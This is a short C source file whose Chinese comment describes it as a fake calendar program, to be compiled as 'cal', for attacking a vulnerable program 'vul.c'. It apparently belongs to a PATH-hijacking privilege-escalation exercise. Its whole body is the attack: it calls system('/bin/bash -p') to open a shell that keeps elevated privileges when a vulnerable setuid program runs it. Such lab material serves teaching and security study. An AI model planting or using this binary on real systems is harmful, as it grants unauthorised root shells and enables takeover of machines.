/* 用来攻击vul,c 的虚假日历程序，编译为名为cal的程序 */

#include <stdlib.h>

int main(int argc, char const *argv[])
{
	system("/bin/bash -p");
	return 0;
}